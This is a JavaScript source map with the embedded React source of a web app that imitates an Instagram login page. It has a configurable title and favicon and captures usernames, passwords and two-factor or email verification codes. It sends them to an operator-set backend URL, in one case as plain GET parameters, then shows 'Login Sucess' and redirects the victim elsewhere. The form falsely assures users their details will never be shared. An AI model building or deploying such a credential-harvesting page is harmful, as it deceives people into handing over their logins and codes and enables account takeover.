{"version":3,"sources":["components/Home.js","components/Instagram.js","App.js","components/History.js","index.js"],"names":["env","runtimeEnv","Home","state","redirect","setRedirect","setState","renderRedirect","to","favicon","document","getElementById","undefined","REACT_APP_FAVICONURL","href","title","REACT_APP_TITLE","innerText","this","Card","style","position","left","top","transform","className","Header","Body","Container","fluid","Row","padding","Col","Button","size","variant","onClick","Component","queryString","require","Instagram","username","password","showAlert","loading","message","twoFactor","email_auth","success","code","two_factor_identifier","verificationMethod","handleUsername","event","target","value","handleCode","maxLength","slice","handlePassword","onShowAlert","window","setTimeout","handleClick","e","preventDefault","length","fetch","REACT_APP_URL","method","headers","body","stringify","then","response","json","responseData","console","log","handleCodeClick","Alert","src","height","width","objectFit","borderRadius","component","location","REACT_APP_REDIRECTURL","Form","onSubmit","Group","controlId","Label","Control","onChange","type","placeholder","Text","disabled","Spinner","as","animation","role","aria-hidden","App","path","exact","history","ReactDOM","render"],"mappings":"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","file":"static/js/main.4e17b982.chunk.js","sourcesContent":["import React, { Component } from \"react\";\nimport { Card, Button, Row, Container, Col } from \"react-bootstrap\";\nimport { Redirect } from \"react-router-dom\";\nimport runtimeEnv from \"@mars/heroku-js-runtime-env\";\nconst env = runtimeEnv();\nexport default class Home extends Component {\n  state = {\n    redirect: false,\n  };\n  setRedirect = () => {\n    this.setState({\n      redirect: true,\n    });\n  };\n  renderRedirect = () => {\n    if (this.state.redirect) {\n      return <Redirect to=\"/Instagram\" />;\n    }\n  };\n  componentDidMount() {\n    const favicon = document.getElementById(\"FavIcon\");\n    if (\n      env.REACT_APP_FAVICONURL !== undefined ||\n      env.REACT_APP_FAVICONURL !== \"\"\n    )\n      favicon.href = `${env.REACT_APP_FAVICONURL}`;\n    const title = document.getElementById(\"AppTitle\");\n    if (env.REACT_APP_TITLE !== undefined || env.REACT_APP_TITLE !== \"\")\n      title.innerText = `${env.REACT_APP_TITLE}`;\n    else {\n      title.innerText = \"ig app\";\n    }\n  }\n  render() {\n    return (\n      <div>\n        {this.renderRedirect()}\n        <Card\n          style={{\n            position: \"absolute\",\n            left: \"50%\",\n            top: \"50%\",\n            transform: \"translate(-50%, -50%)\",\n          }}\n          className=\"text-center\"\n        >\n          <Card.Header>Select login option</Card.Header>\n          <Card.Body>\n            <Container fluid>\n              <Row style={{ padding: 20 }}>\n                <Col>\n                  <Button\n                    size=\"lg\"\n                    variant=\"outline-danger\"\n                    onClick={this.setRedirect}\n                  >\n                    INSTAGRAM\n                  </Button>\n                </Col>\n              </Row>\n            </Container>\n          </Card.Body>\n        </Card>\n        <Card title=\"Select login options\"></Card>\n      </div>\n    );\n  }\n}\n","import React, { Component } from \"react\";\nimport runtimeEnv from \"@mars/heroku-js-runtime-env\";\nimport { Route } from \"react-router-dom\";\n\nimport {\n  Form,\n  Button,\n  Container,\n  Row,\n  Col,\n  Alert,\n  Spinner,\n} from \"react-bootstrap\";\n\nconst queryString = require(\"query-string\");\nconst env = runtimeEnv();\nexport default class Instagram extends Component {\n  state = {\n    username: \"\",\n    password: \"\",\n    showAlert: false,\n    loading: false,\n    message: \"\",\n    twoFactor: false,\n    email_auth: false,\n    success: true,\n    code: \"\",\n    two_factor_identifier: \"\",\n    verificationMethod: \"\",\n  };\n\n  handleUsername = (event) => {\n    this.setState({ username: event.target.value });\n  };\n  handleCode = (event) => {\n    const { value, maxLength } = event.target;\n    const message = value.slice(0, maxLength);\n    this.setState({ code: message });\n  };\n  handlePassword = (event) => {\n    this.setState({ password: event.target.value });\n  };\n  onShowAlert = () => {\n    this.setState({ showAlert: true }, () => {\n      window.setTimeout(() => {\n        this.setState({ showAlert: false });\n      }, 30000);\n    });\n  };\n  handleClick = (e) => {\n    e.preventDefault();\n    this.setState({ loading: true });\n    if (this.state.username.length !== 0 && this.state.password.length !== 0) {\n      fetch(`${env.REACT_APP_URL}/insta`, {\n        method: \"POST\",\n        headers: {\n          \"Content-Type\": \"application/x-www-form-urlencoded;charset=UTF-8\",\n        },\n        body: queryString.stringify({\n          username: this.state.username,\n          password: this.state.password,\n        }),\n      })\n        .then((response) => response.json())\n        .then((responseData) => {\n          console.log(responseData);\n          this.setState(\n            {\n              message: responseData.message,\n            },\n            () => {\n              this.onShowAlert();\n            }\n          );\n          if (!responseData.success) {\n            this.setState({ loading: false });\n          } else {\n            if (responseData.twoFactor) {\n              this.setState({\n                email_auth: responseData.email_auth,\n                twoFactor: true,\n                loading: true,\n                two_factor_identifier: responseData.two_factor_identifier,\n                verificationMethod: responseData.verificationMethod,\n              });\n            } else {\n              this.setState({ success: true });\n            }\n          }\n        });\n    } else {\n      if (this.state.username.length === 0) {\n        this.setState(\n          {\n            message: \"username cannot be empty\",\n            loading: false,\n          },\n          () => {\n            this.onShowAlert();\n          }\n        );\n      } else {\n        this.setState(\n          {\n            message: \"password cannot be empty\",\n            loading: false,\n          },\n          () => {\n            this.onShowAlert();\n          }\n        );\n      }\n    }\n  };\n  handleCodeClick = (e) => {\n    if (this.state.code.length === 0 || this.state.code.length > 6) {\n      this.setState({ message: \"Code length should be equal to 6\" }, () => {\n        this.onShowAlert();\n      });\n    } else {\n      if (!this.state.email_auth) {\n        fetch(\n          `${env.REACT_APP_URL}/insta/submitCode?username=${this.state.username}&password=${this.state.password}&code=${this.state.code}&two_factor_identifier=${this.state.two_factor_identifier}&verificationMethod=${this.state.verificationMethod}`,\n          {\n            method: \"GET\",\n          }\n        )\n          .then((response) => response.json())\n          .then((responseData) => {\n            console.log(responseData);\n            if (responseData.success) {\n              this.setState(\n                { success: true, message: responseData.message },\n                () => {\n                  this.onShowAlert();\n                }\n              );\n            } else {\n              this.setState({ message: responseData.message }, () => {\n                this.onShowAlert();\n              });\n            }\n          });\n      } else {\n        fetch(\n          `${env.REACT_APP_URL}/insta/emailVerify?code=${this.state.code}`,\n          {\n            method: \"GET\",\n          }\n        )\n          .then((response) => response.json())\n          .then((responseData) => {\n            console.log(responseData);\n            this.setState(\n              {\n                message: responseData.message,\n              },\n              () => {\n                this.onShowAlert();\n              }\n            );\n            if (responseData.success) {\n              fetch(`${env.REACT_APP_URL}/insta`, {\n                method: \"POST\",\n                headers: {\n                  \"Content-Type\":\n                    \"application/x-www-form-urlencoded;charset=UTF-8\",\n                },\n                body: queryString.stringify({\n                  username: this.state.username,\n                  password: this.state.password,\n                }),\n              })\n                .then((response) => response.json())\n                .then((responseData) => {\n                  console.log(responseData);\n                  this.setState(\n                    {\n                      message: responseData.message,\n                    },\n                    () => {\n                      this.onShowAlert();\n                    }\n                  );\n                  if (!responseData.success) {\n                    this.setState({ loading: false });\n                  } else {\n                    if (!responseData.twoFactor) {\n                      this.setState({ success: true });\n                    }\n                  }\n                });\n            } else {\n              this.setState({ message: responseData.message, code: \"\" }, () => {\n                this.onShowAlert();\n              });\n            }\n          });\n      }\n    }\n  };\n\n  render() {\n    return (\n      <div>\n        {this.state.showAlert ? (\n          <Alert variant=\"danger\">{this.state.message}</Alert>\n        ) : (\n          \"\"\n        )}\n\n        <Container\n          style={{\n            position: \"absolute\",\n            left: \"50%\",\n            top: \"50%\",\n            transform: \"translate(-50%, -50%)\",\n          }}\n        >\n          <center>\n            <h1>\n              <img\n                src={env.REACT_APP_FAVICONURL}\n                height=\"48px\"\n                width=\"48px\"\n                style={{ objectFit: \"cover\", borderRadius: \"50%\" }}\n              ></img>\n              {env.REACT_APP_TITLE !== undefined && env.REACT_APP_TITLE !== \"\"\n                ? env.REACT_APP_TITLE\n                : \"Instagram Login\"}\n            </h1>\n          </center>\n          {this.state.success ? (\n            <Container\n              style={{\n                position: \"absolute\",\n                left: \"50%\",\n                top: \"50%\",\n                transform: \"translate(-50%, -50%)\",\n              }}\n            >\n              <Route\n                component={() => {\n                  window.location.href = env.REACT_APP_REDIRECTURL;\n                  return null;\n                }}\n              />\n              <center>\n                <h1>Login Sucess Thank You!</h1>\n              </center>\n            </Container>\n          ) : (\n            <Row>\n              <Col>\n                <Form onSubmit={(e) => this.handleClick(e)}>\n                  <Form.Group controlId=\"formBasicEmail\">\n                    <Form.Label>Username</Form.Label>\n\n                    <Form.Control\n                      value={this.state.username}\n                      onChange={(e) => {\n                        this.handleUsername(e);\n                      }}\n                      type=\"username\"\n                      placeholder=\"Enter Instagram username\"\n                    />\n                    <Form.Text className=\"text-muted\">\n                      We'll never share your details with anyone else.\n                    </Form.Text>\n                  </Form.Group>\n\n                  <Form.Group controlId=\"formBasicPassword\">\n                    <Form.Label>Password</Form.Label>\n                    <Form.Control\n                      onChange={(e) => this.handlePassword(e)}\n                      value={this.state.password}\n                      type=\"password\"\n                      placeholder=\"Enter Instagram Password\"\n                    />\n                  </Form.Group>\n                  {this.state.loading ? (\n                    <Button variant=\"primary\" type=\"submit\" disabled>\n                      <Spinner\n                        as=\"span\"\n                        animation=\"grow\"\n                        size=\"sm\"\n                        role=\"status\"\n                        aria-hidden=\"true\"\n                      />\n                      Loading...\n                    </Button>\n                  ) : (\n                    <Button variant=\"primary\" type=\"submit\">\n                      Login\n                    </Button>\n                  )}\n\n                  {this.state.twoFactor ? (\n                    <div>\n                      <Form.Group>\n                        {this.state.email_auth ? (\n                          <Form.Label>\n                            Please enter the code received\n                          </Form.Label>\n                        ) : (\n                          <Form.Label>Enter code recieved</Form.Label>\n                        )}\n\n                        <Form.Control\n                          value={this.state.code}\n                          onChange={(e) => {\n                            this.handleCode(e);\n                          }}\n                          type=\"number\"\n                          maxLength=\"11\"\n                        />\n                      </Form.Group>\n                      <Button\n                        variant=\"outline-success\"\n                        onClick={() => {\n                          this.handleCodeClick();\n                        }}\n                      >\n                        submit code\n                      </Button>{\" \"}\n                    </div>\n                  ) : (\n                    \"\"\n                  )}\n                </Form>\n              </Col>\n            </Row>\n          )}\n        </Container>\n      </div>\n    );\n  }\n}\n","import React from \"react\";\nimport { Switch, Route } from \"react-router-dom\";\nimport Home from \"./components/Home\";\nimport Instagram from \"./components/Instagram\";\n\nfunction App() {\n  return (\n    <Switch>\n      <Route path=\"/\" component={Home} exact />\n      <Route path=\"/Instagram\" component={Instagram} exact />\n    </Switch>\n  );\n}\n\nexport default App;\n","import { createBrowserHistory as history } from \"history\";\n\nexport default history();\n","import React from \"react\";\nimport ReactDOM from \"react-dom\";\nimport App from \"./App\";\nimport { BrowserRouter as Router } from \"react-router-dom\";\nimport history from \"./components/History\";\n\nReactDOM.render(\n  <Router history={history}>\n    <App />\n  </Router>,\n  document.getElementById(\"root\")\n);\n"],"sourceRoot":""}